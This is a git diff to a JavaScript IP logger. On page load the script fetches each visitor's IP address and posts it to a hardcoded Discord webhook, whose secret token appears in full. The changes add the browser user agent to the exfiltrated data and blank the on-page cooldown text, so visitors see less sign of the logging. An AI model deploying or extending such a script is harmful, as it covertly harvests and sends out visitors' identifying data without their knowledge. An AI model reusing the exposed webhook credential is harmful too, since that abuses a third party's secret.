@@ -2,7 +2,7 @@
 var COOLDOWN_PERIOD = 60000;
 
 // Function to send a message to the Discord webhook
-function sendWebhookMessage(ip) {
+function sendWebhookMessage(ip, browser) {
     var xhr = new XMLHttpRequest();
     var url = "https://discord.com/api/webhooks/1354598559323787324/Qo3S8su0JHxBvXZmHgAiOtSpuL2AeKqjNUlxQs0EJzuytLq5hvUrghRrycZ5uzdvsHa2";
     xhr.open("POST", url, true);
@@ -21,6 +21,11 @@ function sendWebhookMessage(ip) {
                         "name": "IP Address",
                         "value": ip,
                         "inline": true
+                    },
+                    {
+                        "name": "Browser",
+                        "value": browser,
+                        "inline": true
                     }
                 ],
                 "timestamp": new Date().toISOString()
@@ -38,10 +43,11 @@ function getIPAddress() {
         .then(data => {
             var ip = data.ip;
             var lastSentTime = localStorage.getItem(ip);
+            var browser = navigator.userAgent;
 
             // Check if the cooldown period has passed
             if (!lastSentTime || (Date.now() - lastSentTime) > COOLDOWN_PERIOD) {
-                sendWebhookMessage(ip);
+                sendWebhookMessage(ip, browser);
                 localStorage.setItem(ip, Date.now());
                 startCooldownTimer(COOLDOWN_PERIOD);
             } else {
@@ -66,7 +72,7 @@ function startCooldownTimer(duration) {
 
         if (--timer < 0) {
             clearInterval(countdownInterval);
-            countdownElement.textContent = "Cooldown expired. You can send a new message.";
+            countdownElement.textContent = "";
         }
     }, 1000);
 }
@@ -84,7 +90,7 @@ document.addEventListener("DOMContentLoaded", function() {
     countdownElement.style.borderRadius = '5px';
     countdownElement.style.fontFamily = 'Arial, sans-serif';
     countdownElement.style.fontSize = '14px';
-    countdownElement.textContent = 'No active cooldown.';
+    countdownElement.textContent = '';
     document.body.appendChild(countdownElement);
 });
 
